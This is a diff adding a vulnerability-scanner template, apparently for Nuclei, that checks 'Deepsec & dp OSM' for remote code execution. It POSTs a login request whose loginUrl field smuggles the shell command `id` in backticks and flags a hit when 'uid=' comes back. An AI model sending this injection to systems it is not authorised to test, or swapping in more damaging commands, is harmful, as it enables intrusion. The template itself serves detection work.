@@ -1,0 +1,19 @@
+id: deepsec-dp-osm-rce
+info:
+  name: Deepsec & dp OSM RCE Vulnerability
+  author: Qwen
+  severity: high
+  description: This rule checks for Remote Code Execution vulnerability in Deepsec & dp OSM.
+requests:
+  - method: POST
+    path:
+      - "/fort/portal_login"
+    headers:
+      Cookie: "FORTSESSIONID=78DFD83A276124B65ECA5D316D66D47F"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
+      Content-Type: "application/json"
+    body: '{"userName":"Bob", "loginUrl":"`id`", "role":"", "password":"123456789"}'
+    matchers:
+      - type: word
+        words:
+          - "uid="
